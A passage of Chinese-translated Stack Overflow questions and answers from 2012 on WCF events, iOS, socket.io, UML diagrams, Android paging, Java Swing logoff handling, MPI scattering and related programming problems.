    {
        public event EventHandler UserListChanged;

        public void Logon(UserInfo userInfo)
        {
            OnUserListChanged();
        }

        public void Logout()
        {
            OnUserListChanged();
        }

        private void OnUserListChanged()
        {
            var handler = UserListChanged;
            if (handler != null)
            {
                handler(this, EventArgs.Empty);
            }
        }
    }
} 
```

用户信息类：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.Serialization;

namespace NetworkLib
{
    [DataContract]
    public class UserInfo
    {
        [DataMember]
        public string Name;
    }
} 
```

**在我的 ServerApp (WPF) 中：**

```
using System.ServiceModel;
using NetworkLib;

namespace ServerApp
{
    public partial class MainWindow : Window
    {

        NetworkService networkService;

        public MainWindow()
        {
            InitializeComponent();

            ServiceHost host = new ServiceHost(typeof(NetworkService));

            host.Open();

            networkService = new NetworkService();

            networkService.UserListChanged += networkService_UserListChanged;

        }

        private void networkService_UserListChanged(object sender, EventArgs e)
        {
            MessageBox.Show("It Works!");
        }
    }
} 
```

**在我的 ClientApp (WPF) 中：（已对服务器进行了服务引用）**

```
namespace ClientApp
{

    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, RoutedEventArgs e)
        {
            ServiceReference.NetworkServiceClient proxy = new ServiceReference.NetworkServiceClient();

            ServiceReference.UserInfo userInfo = new ServiceReference.UserInfo();

            userInfo.Name = "Test";

            proxy.Logon(userInfo);

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:37:59.670

您订阅了其他 NetworkService 实例的事件，而不是 ServiceHost 实例化的事件。在您的情况下，每次向服务器发出请求时，都会创建新的 NetworkService 实例。将以下属性置于 NetworkService 类之上：

```
[ServiceBehavior(InstanceContextMode = InstanceContextMode.Single)] 
```

然后订阅事件：

```
var serviceInstance = (NetworkService)host.SingletonInstance;
serviceInstance.UserListChanged += networkService_UserListChanged; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:35:48.860

创建 ServiceHost 时，您应该提供 NetworkService 实例而不是`typeof(NetworkService)`

```
ServiceHost host = new ServiceHost(networkService); 
```

当然，您需要先初始化它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:32:49.290

我没有看得很详细，但总的来说你的代码看起来还不错。在这种情况下，有时运行 2 个 VisualStudio 实例很有用——一个用于调试中的服务器，一个用于调试中的客户端。如果您在调试客户端的 VS 中的客户端 button1_Click 代码中放置一个断点，在调试服务器的 VS 中的 NetworkServices.Logout 中放置一个断点，您将能够从客户端跳转到服务器代码并轻松查看哪里出了问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T07:46:16.143

为什么在这里需要一个事件模型？为什么不直接在 NetworkService.Logout() 中处理您的“事件”。将其推迟到一个事件然后必须连接该事件（正如 ilya.dofofeev 正确指出的那样不在同一个对象上）提供任何真正的好处吗？

# iphone - iphone中的特殊字符xml解析问题

> ID：10084745
> 
> 赞同：1
> 
> 时间：2012-04-10T07:25:16.800
> 
> 标签：iphone, objective-c, xcode

当我尝试解析包含电子邮件地址的 xml 时说 john@abc.com，它只显示“abc.com”。我怎样才能让它显示完整的电子邮件地址。在其他情况下，我使用以下内容删除了一些特殊字符：-

```
 string=[string stringByReplacingOccurrencesOfString:@"$" withString:@""]; 
```

但在这里我必须包括符号“@”和它前面的字符。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T07:53:57.813

嗯...终于为自己找到了解决方案。我将 xml 数据转换为字符串并替换了字符。以下是代码：-

```
NSError* error;
NSString *content = [NSString stringWithContentsOfURL:url encoding:NSASCIIStringEncoding error:&error];
content=[content stringByReplacingOccurrencesOfString:@"&#64;" withString:@"@"];
NSData *data = [content dataUsingEncoding:NSUTF8StringEncoding]; 
```

问题解决了 ：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:32:05.757

```
NSString *string = @"$amdocs.com";
string=[string stringByReplacingOccurrencesOfString:@"$" withString:@"@"];
NSLog(@"%@",string); 
```

也许它会帮助你。

# firefox - Socket.io 无法在 Chrome 和 Firefox 上向 Node 服务器发送消息

> ID：10084752
> 
> 赞同：6
> 
> 时间：2012-04-10T07:26:01.373
> 
> 标签：firefox, node.js, google-chrome, websocket, socket.io

我现在正试图弄清楚我的代码/设置有什么问题。基本上我想从客户端向服务器发送一条消息。以下适用于**除**FF(11) 和 chrome(18.0.1025.152 m) 之外的所有浏览器。

这是一些信息：

1.  我在 Windows 7 企业 64 位机器上运行 Node.js
2.  我使用 apache 从 localhost 提供页面
3.  我正在使用 socket.io 监听端口 8080
4.  看起来 chrome 和 FF 回退到 xhr-polling / jsonp-polling 而不是使用套接字
5.  我可以从服务器推送消息，但我不能从客户端发出

服务器代码：

```
var io = require('C:/Users/shlomis/node_modules/socket.io/lib/socket.io').listen(8080);

io.sockets.on('connection', function (socket) {
    socket.on('my event', function (msg) {
        console.log("DATA!!!");
    });
}); 
```

**如果没有完整路径，我找不到要求的方法**

客户端代码：

```
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Hello World!</title>
    <meta charset="utf-8">

    <script src="http://localhost:8080/socket.io/socket.io.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function(){
            var socket = io.connect('http://localhost:8080');
            $("#button").click(function() {
                socket.emit('my event' ,"Hello World!");
            })
        })
    </script>
</head>

<body>
<button type="button" id='button'>Send Message</button>
</body>

</html> 
```

模块版本：

```
C:\Users\shlomis>npm ls
mukhin_chat@0.0.1 C:\Users\shlomis
├─┬ express@2.5.9
│ ├─┬ connect@1.8.6
│ │ └── formidable@1.0.9
│ ├── mime@1.2.4
│ ├── mkdirp@0.3.0
│ └── qs@0.4.2
└─┬ socket.io@0.9.5
  ├── policyfile@0.0.4
  ├── redis@0.6.7
  └─┬ socket.io-client@0.9.5
    ├─┬ active-x-obfuscator@0.0.1
    │ └── zeparser@0.0.5
    ├── uglify-js@1.2.5
    ├─┬ ws@0.4.12
    │ ├── commander@0.5.2
    │ └── options@0.0.3
    └── xmlhttprequest@1.2.2 
```

节点日志：

```
C:\Users\shlomis>node C:\dev\wamp\www\AR\js\videoServer.js
   info  - socket.io started
   debug - served static content /socket.io.js
   debug - client authorized
   info  - handshake authorized 17502185141066845391
   debug - setting request GET /socket.io/1/websocket/17502185141066845391
   debug - set heartbeat interval for client 17502185141066845391
   debug - client authorized for
   debug - websocket writing 1::
   debug - setting request GET /socket.io/1/xhr-polling/17502185141066845391?t=1334041653716
   debug - setting poll timeout
   debug - discarding transport
   debug - cleared heartbeat interval for client 17502185141066845391 
```

chrome WS 请求（101 切换协议）： ![在此处输入图像描述](../Images/060022f0b32af8d19cabb72e975a2f94.png)

铬 XHR 请求： ![在此处输入图像描述](../Images/3bd97474fa031ae9bb322b35b761e3df.png)

**更新：**我添加了

```
socket.on('connect', function () {
     console.log("connected");
}); 
```

它永远不会在铬上触发。

那么有什么问题呢？请帮忙:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T09:17:51.100

我相信您为客户端使用了错误的 socket.io.js 文件？

[https://github.com/LearnBoost/socket.io-client/tree/master/dist](https://github.com/LearnBoost/socket.io-client/tree/master/dist)

您应该在您拥有客户端内容的文件夹中使用这些文件，即： `../js/socket.io.min.js`

关于require问题，你用的是npm吗？进入 nodeJS 项目文件夹并运行以下命令：

`npm install socket.io`

这应该安装到`node_modules`您的项目文件夹内的文件夹中，并且通过执行`require('socket.io');`您应该能够访问该模块。

如果这不起作用，您可能安装了损坏的节点。

PS：您是否使用相同的文件端口？您似乎正在寻找端口 8080 上的 socket.io 文件，然后连接到端口 8080 上的 nodeJS 以进行套接字连接...

尝试使用另一个端口？

# ios - iOS：如何从 DetailView 导航到 DetailView？

> ID：10084761
> 
> 赞同：1
> 
> 时间：2012-04-10T07:26:38.970
> 
> 标签：ios, uitableview, ios5, ios4, detailview

我正在 Apple Developer 网站上查看适用于 iOS 的 SimpleDrillDown 示例：http: [//developer.apple.com/library/ios/#samplecode/SimpleDrillDown/Introduction/Intro.html](http://developer.apple.com/library/ios/#samplecode/SimpleDrillDown/Introduction/Intro.html)

有一个 UITableView，当用户选择项目时，我们导航到 DetailView。

现在，我希望能够单击 DetailView 中的项目并为该项目打开一个新的 DetailView 并填充相应的内容。

基本上，如何从 DetailView 导航到 DetailView？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:24:16.793

视图控制器之间没有 1:1 的关系。在 ios 导航控制器中，有一个根视图控制器，其他的是详细视图控制器。

推送视图控制器后，您可以从该视图中推送其他视图控制器。

在导航控制器中维护所有视图控制器的堆栈。

你可以使用推送视图控制器

`[self.navigationController pushViewController:ctrl animated:YES];`

然后你可以使用弹出一个视图控制器

`[self.navigationController popViewControllerAnimated:YES];`

还可以使用堆栈中的特定视图

```
 [self.navigationController popToViewController:[[self.navigationController viewControllers] objectAtIndex:1] animated:YES]; 
```

并返回根视图控制器

```
 [self.navigationController popToRootViewControllerAnimated:YES]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:13:21.837

只需在 DetailView 中新建一个 DetailView 并推送即可。

# wpf - ListView 选择更改不会删除旧项目

> ID：10084762
> 
> 赞同：0
> 
> 时间：2012-04-10T07:26:39.243
> 
> 标签：wpf, listview, observablecollection, selectionchanged

我的 WPF ListView 控件有一个奇怪的行为。
ListViews ItemSource 是 Observable 集合。ItemSource 会定期更新。
当我选择其中一个项目然后选择其他项目并且没有更新项目时，一切正常。
但是当我选择一个项目时，女巫在我站立时更新，然后选择其他项目，现在我选择了两个项目而不是一个。
当我查看调试器时，我看到了 SelectionChanged 事件的事件参数。我看到添加的项目是好的，但没有删除的项目。
有谁知道有什么问题？
谢谢！

编辑：

我的可观察集合：

```
 protected class CustomObservableCollection : ObservableCollection<T>
    {
        public void Refresh()
        {
            ListCollectionView lcv = (ListCollectionView)(CollectionViewSource.GetDefaultView(this));
            lcv.Refresh();
        }
    } 
```

当某些项目发生变化时调用的更新方法：

```
 public void RefreshItem(T domainObject)
    {
        foreach (T item in obsCollection) {
            if (!DomainObjectComparer.Equals(domainObject, item)) continue;
            DomainObjectCopier.CopyProperties(domainObject, item);
            obsCollection.Refresh();
            break;
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T11:43:00.790

看起来您的复印机类使您的集合中的两个项目相等（我认为，从上面有限数量的代码中推断出这一点）。

如果 ListView 中的两个或多个项目相同（相等），则选择一个将选择所有项目，因为在选择逻辑中使用了相等比较器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:28:07.183

好吧，显然问题出在 ListView 项目对象的重写 GetHashCode() 方法上。哈希码包括其计算中的所有字段。我删除了所有字段（属性），现在被覆盖的 GetHashCode() 仅根据项目的 ID 计算哈希。它解决了这个问题。
我也重写了 Equals() 方法。
如果有人知道它为什么相关，我想知道。

# ubuntu - 如何在 ubuntu (g++) 上的 makefile 中链接第三方库

> ID：10084765
> 
> 赞同：2
> 
> 时间：2012-04-10T07:26:56.340
> 
> 标签：ubuntu, makefile, g++

我正在尝试将用于单元测试的 cpptest 库链接到我的项目，但不知道如何在我的 Makefile 中链接第三方库。你能给我一个示例代码或一个好的教程吗？我还没有找到任何好的

# uml - 序列图和通信图有什么区别？

> ID：10084771
> 
> 赞同：10
> 
> 时间：2012-04-10T07:27:10.487
> 
> 标签：uml, sequence-diagram, communication-diagram

谁能解释一下序列图和通信图有什么区别？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-10T07:30:38.457

两个图都提供了相同的信息，但序列图在其布局中强调时间，而通信图则在其布局中强调正在通信的对象。

时间在序列图中是隐含的（通过垂直位置推断），而在通信图中明确给出（通过数字）。

引用[斯科特·安布勒的话](http://www.agilemodeling.com/artifacts/communicationDiagram.htm)

> 通信图和序列图之间的主要区别在于，序列图擅长显示时序逻辑，但不擅长为您提供“全局视图”，而通信图恰恰相反。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-24T21:08:54.540

强调消息的时间顺序（使用序列图）

强调交互对象之间的结构关系（使用通信图）。

参考：UML 用户手册

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-10T09:42:30.903

序列图以一种栅栏格式说明交互，其中每个新对象都添加到右侧。

这在代码中可能代表什么？可能，该类 A 有一个名为 doOne 的方法和一个 B 类型的属性。此外，该类 B 具有名为 doTwo 和 doThree 的方法。或许 A 类的部分定义是：

```
public class A
   {
   private B myB = new B();

   public void doOne()
   {
   myB.doTwo();
   myB.doThree();
   }
   // . . 
   } 
```

通信图以图形或网络格式说明对象交互，其中对象可以放置在图上的任何位置（它们的墙草图优势的本质）。

序列图与通信图的优缺点是什么？

每种图表类型都有优势，建模者有特殊的偏好——没有绝对“正确”的选择。然而，UML 工具通常强调序列图，因为它们具有更大的符号能力。

序列图比通信图有一些优势。也许首先，UML 规范更加以序列图为中心——在符号和语义上投入了更多的思考和努力。因此，工具支持更好，并且有更多的符号选项可用。此外，使用序列图更容易查看调用流序列——只需从上到下阅读。对于通信图，我们必须阅读序列号，例如“1：”和“2：”。因此，序列图非常适合用于记录文档或轻松阅读逆向工程调用流序列，该序列是使用 UML 工具从源代码生成的。

但另一方面，通信图在应用“UML 作为草图”在墙上绘制（敏捷建模实践）时具有优势，因为它们更节省空间。这是因为盒子可以很容易地放置或擦除任何地方——水平或垂直。因此，使用通信图修改墙壁草图也更容易——很简单（在创造性的高变化 OO 设计工作期间）在一个位置擦除一个框，在其他位置绘制一个新框，然后在其上画一条线。相反，序列图中的新对象必须始终添加到右边缘，这是有限的，因为它会快速消耗并耗尽页面（或墙壁）上的右边缘空间；垂直维度的自由空间没有得到有效利用。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2014-06-06T23:00:47.013

面向对象设计的一个基本规则是根据不同的目的使用不同的图表。在这方面，序列图用于对顺序逻辑进行建模，同时可以使用通信图（以前称为 UML 1.x 中的协作图）来显示多个对象协作在一起以实现共同目的的行为。- 阅读更多[>>这里<<](http://www.agilemodeling.com/artifacts/communicationDiagram.htm#sthash.nqqQjdHp.dpuf)和[>>这里<<](http://www.cs.cityu.edu.hk/~wkchan/content/communication-diagram-vs-sequence-diagram-vs-state-machine-diagram)

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2012-04-10T07:40:31.110

以下链接是序列图和通信之间差异的简短答案。请参考。

[序列图和通信的区别](http://www.uml-diagrams.org/sequence-diagrams-questions-answers.html)

# image-processing - 从扫描的纸张中提取单词的图像

> ID：10084779
> 
> 赞同：1
> 
> 时间：2012-04-10T07:27:36.060
> 
> 标签：image-processing, image-segmentation, scanning

我想获得许多扫描书籍（即波斯语（阿拉伯语脚本））中每个单词的小图像。我没有图像处理方面的实验。
我怎样才能以最有效的方式做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T09:44:13.663

我建议你在 MATLAB 中编写一个类似这样的脚本。
a ：字母之间最大距离的一半。（以像素为单位）
b ：单词之间的最小距离的一半。（以像素为单位）
（希望 a < b ）

对页面的扫描图像设置阈值。

```
I(I < Th) = 0;I(I > Th) = 1; 
```

通过实验选择“Th”。您应该得到一个二进制图像“我”，其中字母为 1。放大图像。

```
imdilate(I,a); 
```

这会将字母连接在一起。
去除噪音。

```
I = bwareaopen(I,n); 
```

这将删除所有少于 n 个像素的连接组件。
进行连通分量分析。

```
CC = bwconncomp(I);  
Rect = regionprops(I,'BoundingBox'); 
```

这将返回包含单个单词的矩形的坐标列表。从原始副本中提取子矩阵并使用 imwrite() 写入图像。

# java - 在android中通过触摸在活动之间滑动

> ID：10084782
> 
> 赞同：1
> 
> 时间：2012-04-10T07:27:51.780
> 
> 标签：java, android

我如何让用户在 android 中通过触摸在页面之间滑动我正在使用 android 2.1

我找到了这个链接，但我不确定 ViewPager 是否适用于 2.1 [ViewPager](http://android-developers.blogspot.com/2011/08/horizontal-view-swiping-with-viewpager.html)

所以我找到了 Viewflipper 和 ViewSwitcher。它和 Viewpager 做同样的事情吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:54:27.593

我想你会从这些链接中得到一个想法。对于左右滑动页面，最好的方法是使用自定义视图。

[http://mobile.tutsplus.com/tutorials/android/android-user-interface-design-horizo​​ntal-view-paging/](http://mobile.tutsplus.com/tutorials/android/android-user-interface-design-horizontal-view-paging/)

[https://github.com/grantland/android-horizo​​ntalpager](https://github.com/grantland/android-horizontalpager)

[http://savagelook.com/blog/android/swipes-or-flings-for-navigation-in-android](http://savagelook.com/blog/android/swipes-or-flings-for-navigation-in-android)

[http://blog.sephiroth.it/2011/04/04/imageview-zoom-and-scroll/](http://blog.sephiroth.it/2011/04/04/imageview-zoom-and-scroll/)

Horizo​​ndalpager 是最好的选择。希望这会帮助你到达那里:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:32:18.573

[Viewpager](http://developer.android.com/reference/android/support/v4/view/ViewPager.html)是您想要使用的，并且可以与 2.1 一起使用（它是向后兼容的支持库的一部分）

Viewflipper 不允许您滑动。它只是根据需要切换一个视图和另一个视图。

# java - 中止 Windows 从 Java 注销

> ID：10084784
> 
> 赞同：4
> 
> 时间：2012-04-10T07:27:57.957
> 
> 标签：java, windows, logoff

我有一个 Swing 应用程序，用户可以在其中创建和保存文档。该应用程序被部署为一个简单的 Jar 文件。

主要目标平台是 Windows Vista。

如果用户在应用程序中有打开且未保存的文档，并且用户正在从 Windows Vista 机器注销，我想停止注销过程并询问用户是否要在 Java 应用程序之前保存到文档终止。

是否可以从 Java 应用程序停止 Windows Vista 上的注销过程？

我试过关机钩子没有成功。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T07:36:59.150

> 是否可以从 Java 应用程序停止 Windows Vista 上的注销过程？

不，也不应该是可能的。这就像摇狗的尾巴一样。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:38:56.843

编辑2

* * *

对于那些关注讨论的人，我留下了我的第一个答案，但似乎它们不起作用。首先找到我真正的解决方案。

好的，所以我认为这确实有效，但它并不完全可以接受，因为它使用了 API 的受限部分（但它从 Java 1.3 开始就存在并且仍然存在于 Java 1.7 中）。它使用 sun.misc.Signal。大部分代码最初由**Andrew Thompson**发布。

```
import java.awt.AWTEvent;
import java.awt.EventQueue;
import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;

import sun.misc.Signal;
import sun.misc.SignalHandler;

class TestShutDown {
    static final String WINDOW_MODIFIED = "windowModified";

    TestShutDown() {
        final JFrame f = new JFrame("Log Off!");
        f.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        f.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent we) {
                System.err.println("Window closing");
                handleQuit(f);
            }

        });
        Signal.handle(new Signal("TERM"), new SignalHandler() {

            @Override
            public void handle(Signal arg0) {
                handleQuit(f);
            }
        });
        // bad practice, but not the point..
        f.setSize(400, 200);
        f.setLocationByPlatform(true);
        f.setVisible(true);
    }

    protected static void handleQuit(final JFrame f) {
        int result = JOptionPane.showConfirmDialog(f, "Close Me");
        if (result == JOptionPane.OK_OPTION) {
            System.exit(0);
        }
    }

    public static void main(String[] args) {
        // start the GUI on the EDT
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new TestShutDown();
            }
        });
    }
} 
```

* * *

先前建议的解决方案（在注销时不起作用）

我假设您正在使用带有`JFrame`.

在您的`JFrame`中，设置以下内容：

```
setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE); 
```

然后，`WindowAdapter`在您的`JFrame`. 覆盖该`windowClosing()`方法并从那里打开一个阻止对话框以询问用户他想要做什么（是/否/取消）。如果他选择是，你保存然后处置框架，如果他选择否，你只需处置框架。如果他选择取消，你什么都不做。

* * *

编辑：

这是一些代码和更多关于我正在解释的内容以及**Andrew Thompson**带来的细节。所有学分都应归于他以下：

使用此代码：

```
import java.awt.event.*;
import javax.swing.*;

class TestShutDown {

    TestShutDown() {
        final JFrame f = new JFrame("Log Off!");
        f.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        f.addWindowListener( new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent we) {
                int result = JOptionPane.showConfirmDialog(f, "Close Me");
                if (result==JOptionPane.OK_OPTION) {
                    System.exit(0);
                }
            }
        });
        // bad practice, but not the point..
        f.setSize(400,200);
        f.setLocationByPlatform(true);
        f.setVisible(true);
    }

    public static void main(String[] args) {
        // start the GUI on the EDT
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new TestShutDown();
            }
        });
    }
} 
```

然后告诉Windows关闭，我明白了..

![Windows 拒绝关闭](../Images/278854adff396d7523b2f86273fae35a.png)

更有趣的是，在我点击`Cancel`（哎呀，“寻找不明飞行物”是播放器中的下一个排队曲目，我不打算重新安排它:) 之后，我无法点击帧。似乎它被一个不可见的模态对话框阻止了。我必须杀死虚拟机才能摆脱它。

# java - 显示一个 ImageIcon

> ID：10084787
> 
> 赞同：4
> 
> 时间：2012-04-10T07:28:07.207
> 
> 标签：java, swing, paint, imageicon

我正在尝试在`JPanel`. 我正在使用一个`ImageIcon`来渲染图像，并且图像与类文件位于同一目录中。但是，没有显示图像，也没有发生错误。任何人都可以帮助解决我的代码有什么问题...

```
package ev;

import java.awt.Graphics;
import javax.swing.ImageIcon;
import javax.swing.JPanel;

public class Image extends JPanel {

    ImageIcon image = new ImageIcon("peanut.jpg");
    int x = 10;
    int y = 10;

    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        image.paintIcon(this, g, x, y);
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-01-28T12:51:15.573

这是程序员之间的常见混淆。从 `getClass().getResource(path)`类路径加载资源。

`ImageIcon image = new ImageIcon("peanut.jpg");`

如果我们只提供图像文件的名称，那么 Java 会在当前工作目录中查找它。如果您使用的是 NetBeans，则 CWD 是项目目录。您可以通过以下调用在运行时找出 CWD：

`System.out.println(new File("").getAbsolutePath());`

以下是一个代码示例，您可以在其中自己测试。

```
package com.zetcode;

import java.awt.Dimension;
import java.awt.Graphics;
import java.io.File;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

class DrawingPanel extends JPanel {

    private ImageIcon icon;

    public DrawingPanel() {

        loadImage();
        int w = icon.getIconWidth();
        int h = icon.getIconHeight();
        setPreferredSize(new Dimension(w, h));

    }

    private void loadImage() {

        icon = new ImageIcon("book.jpg");
    }

    @Override
    public void paintComponent(Graphics g) {
        super.paintComponent(g);

        icon.paintIcon(this, g, 0, 0);
    }

}

public class ImageIconExample extends JFrame {

    public ImageIconExample() {

        initUI();
    }

    private void initUI() {

        DrawingPanel dpnl = new DrawingPanel();
        add(dpnl);

        // System.out.println(new File("").getAbsolutePath());         

        pack();
        setTitle("Image");
        setLocationRelativeTo(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);        
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {                
                JFrame ex = new ImageIconExample();
                ex.setVisible(true);                
            }
        });
    }
} 
```

`下图显示了如果我们只向`ImageIcon`构造函数提供图像名称，则将 book.jpg 图像放在 NetBeans 中的哪个位置。`

 `![图像在 NetBeans 项目中的位置](../Images/11a811a992dbd06112a980153e35c1f1.png)

我们从命令行有相同的程序。我们在 ImageIconExample 目录中。

```
$密码
/home/vronskij/prog/swing/ImageIconExample

$树
.
├── book.jpg
└── com
    └── zetcode
        ├── DrawingPanel.class
        ├── ImageIconExample$1.class
        ├── ImageIconExample.class
        └── ImageIconExample.java

2个目录，5个文件

```

该程序使用以下命令运行：

`$ ~/bin/jdk1.7.0_45/bin/java com.zetcode.ImageIconExample`

[您可以在我的在 Java 中显示图像](http://zetcode.com/java/displayimage/)教程中找到更多信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T08:23:49.663

你应该使用

```
ImageIcon image = new ImageIcon(this.getClass()
                .getResource("org/myproject/mypackage/peanut.jpg")); 
````

# c# - 如何像我的示例一样从 c# 读取堆栈跟踪？

> ID：10084789
> 
> 赞同：0
> 
> 时间：2012-04-10T07:28:09.013
> 
> 标签：c#, stack-trace

如何阅读这个堆栈跟踪？谁能解释我如何理解这一点以修复错误。

```
"Frame    Image             Function                                                             Offset    
0        coredll.dll       xxx_RaiseException                                                   19        
1        mscoree3_7.dll                                                                         436488    
2        mscoree3_7.dll                                                                         386545    
3        mscoree3_7.dll                                                                         540936    
4                          TransitionStub                                                       0         
5                          GeoCaching.Main.btnGoToPin_Click                                     312       
6                          System.Windows.Controls.Primitives.ButtonBase.OnClick                132       
7                          System.Windows.Controls.Button.OnClick                               120       
8                          System.Windows.Controls.Primitives.ButtonBase.OnMouseLeftButtonUp    228       
9                          System.Windows.Controls.Control.OnMouseLeftButtonUp                  100       
10                         MS.Internal.JoltHelper.FireEvent                                     896       
11       mscoree3_7.dll                                                                         429164    
12       mscoree3_7.dll                                                                         430528    
13       mscoree3_7.dll                                                                         610803    
14       mscoree3_7.dll                                                                         374593    
15                                                                                              0         
16       agcore.dll        CCoreServices::CLR_FireEvent                                         385       
17       npctrl.dll        CControlBase::ScriptCallback                                         435       
18       npctrl.dll        CXcpDispatcher::OnScriptCallback                                     547       
19       npctrl.dll        CXcpDispatcher::OnReentrancyProtectedWindowMessage                   479" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:36:39.700

您不会从该堆栈跟踪中获得太多信息。您可以读取`Image`名称，即方法所在的程序集的名称，以及`Function`名称，即方法的名称。

看起来`GeoCaching.Main.btnGoToPin_Click`or`TransitionStub`方法中存在异常，但堆栈跟踪本身并不能告诉您是哪种异常，或者在 Exception 对象中放入了哪些信息。

如果您已经编译了带有调试信息的应用程序，您将在堆栈跟踪中获得更多信息，例如每个方法中的行号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:37:03.767

从提供的信息中只能说你里面有一个例外`btnGoToPin_Click`。

要查看它的真正来源，请`try/catch` 在该事件处理程序中添加一个，很可能您会发现错误。

祝你好运

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:44:40.557

如前所述，错误出现在 btnGoToPin_Click **但**应用程序是在发布模式下编译的，这就是为什么你没有完整的堆栈跟踪。

当应用程序在发布模式下编译时，编译器会进行多项优化。第一个可能适用于您的案例的方法是用此方法的主体替换对小方法的调用。这称为“内联优化”

因此，您的错误可能在 btnGoToPin_Click 中调用的另一个方法中，但由于内联，堆栈跟踪不可见。

如果您想了解有关内联的更多信息，这是一篇[不错的文章](http://www.ademiller.com/blogs/tech/2008/08/c-inline-methods-and-optimization/)

# c - 浮动的 MPI_Scatter 分配 - MPI,C

> ID：10084791
> 
> 赞同：0
> 
> 时间：2012-04-10T07:28:21.130
> 
> 标签：c, mpi

我从 MPI 开始。对于我正在做的作业，我需要通过将作业分配给不同的进程来生成我们指定的输入总和。当我得到整数结果时，我的程序运行良好。例如 20/20 = 1 或 20/10 = 2。但是当我得到小数点 20/9 =2.222 时，我会遇到麻烦并得到错误的结果。我不太确定如何解决这个问题。这是我的分散和产生总和的代码。

> 其中 readNumber = 读入的值（例如 20）存储 = 具有值的数组（1,2,3,4....20）

```
/*Scatter*/ 
    MPI_Scatter(storage, readNumber/size, MPI_INT, 

                         recStorage, readNumber/size, MPI_INT, 0, MPI_COMM_WORLD);

    total=0;
    printf("%d \n",readNumber/size);
    for(i=0;i<readNumber/size;i++){
        total=total+recStorage[i];
    }
    printf("rank= %d total= %d \n ",rank,total);

    /*Reduce*/

    MPI_Reduce( &total, &gtotal, send_count, MPI_INT, MPI_SUM, 0,   MPI_COMM_WORLD);

    if(rank == 0){
      printf("total = %d \n ",gtotal);
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:49:39.707

如果你想获得浮点结果，你应该在 scatter 和 reduce 中使用 MPI_FLOAT 作为类型参数。

编辑：另外，如果您想获得浮点结果，请不要在 printf 中使用 %d 。

第二次编辑：在澄清答案后。您不能将非整数元素用于已发送和已接收元素。看看[这里](http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Scatter.html)。

第三编辑：您可以处理向每个处理器发送不相等数量的元素。看看[MPI_Scatterv](http://www.open-mpi.org/doc/v1.5/man3/MPI_Scatterv.3.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T08:18:00.270

我认为您的问题是您试图向每个进程发送相同大小的工作包，即使进程数不是工作量的除数。我的意思是，如果你想对一个 2000 个元素数组的元素求和，那么 4 个处理器中的每一个都会得到 500 个元素，9 个处理器中的每一个都会得到，...... 错误挂在......在整数除法中`2000/9 = 222`，但是`9*222==1998`如果你不'不要注意你的数组的 2 个元素不会被添加到总和中。您必须做出安排，将这些元素分配给流程。

既然这是你的作业，我会把细节留给你。

# javascript - 确保一次只运行一个 setTimeout（处于活动状态）？

> ID：10084794
> 
> 赞同：2
> 
> 时间：2012-04-10T07:28:33.633
> 
> 标签：javascript, recursion, global-variables, settimeout, function-call

递归`setTimeout`函数 getRandomProducts`onload`在 html body 标签中被调用，因此不断迭代。正在从导航栏的嵌套 ul 中的链接

